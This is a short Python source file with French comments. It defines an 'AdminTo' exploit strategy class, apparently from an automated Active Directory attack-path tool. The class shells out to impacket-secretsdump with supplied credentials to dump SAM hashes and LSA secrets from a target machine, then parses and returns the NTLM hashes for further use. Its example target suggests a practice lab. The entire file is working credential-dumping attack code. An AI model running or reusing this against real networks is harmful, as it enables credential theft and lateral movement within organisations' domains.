import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class AdminToStrategy(ExploitStrategy):
    """
    AdminTo — Droits administrateur local sur la machine cible.
    Dump les hashes SAM + secrets LSA via impacket-secretsdump.

    FIX: suppression de -outputfile → les hashes arrivent sur stdout.
    """

    def describe(self, edge: Edge) -> str:
        return (
            f"[AdminTo] {edge.source_node.label} est admin local sur "
            f"{edge.goal_node.label} → dump SAM + LSA"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        target = edge.goal_node.label   # ex: KINGSLANDING.SEVENKINGDOMS.LOCAL

        # FIX: pas de -outputfile → stdout contient tous les hashes
        # -target-ip évite les problèmes de résolution DNS en lab
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{target}",
            "-target-ip", dc_ip,
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr

            # Format NTLM : user:RID:LMhash:NThash:::
            hashes = [
                line.strip()
                for line in output.splitlines()
                if ":::" in line and not line.startswith("[")
            ]

            success = len(hashes) > 0

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":   "ntlm_hashes",
                    "target": target,
                    "hashes": hashes,
                } if success else None,
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}